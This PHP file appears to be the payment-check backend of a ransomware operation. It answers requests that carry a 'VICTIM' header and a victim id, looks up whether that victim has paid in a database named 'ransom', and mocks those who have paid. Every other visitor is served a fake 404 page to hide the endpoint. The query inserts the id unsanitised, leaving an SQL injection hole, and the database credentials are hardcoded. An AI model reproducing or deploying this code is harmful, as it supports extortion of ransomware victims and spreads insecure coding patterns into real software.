<?php
	if( isset($_GET['id']) && ($_SERVER['HTTP_VICTIM'])){
		$id = $_GET['id'];
		$dbconn = pg_connect("host=localhost port=5432 dbname=ransom user=postgres password=admin");
		if(!$dbconn){
			echo "System Down!Try later";
			exit;
		}
		$query = "SELECT payment_status from ransomware_details where identifier='$id';";
		$result = pg_query($dbconn,$query);
		$tmp = pg_fetch_row($result)[0];
		if($tmp == 'Yes'){
			echo "Congratulations!\n You have paid the ransom!\n Decrypt your files now and don't be dumb next time.\n Hope you learned your lesson :)";
		}
		else{
			echo "Pay the ransom first!";
			exit;
		}
		pg_close();
	}
	else{
	//404 page
		echo "<html>
		<head>
			<title>404 Error - Page Not Found</title>
		</head>
			<body>404 Error - Page Not Found!</body>
		</html>";
	}
?>
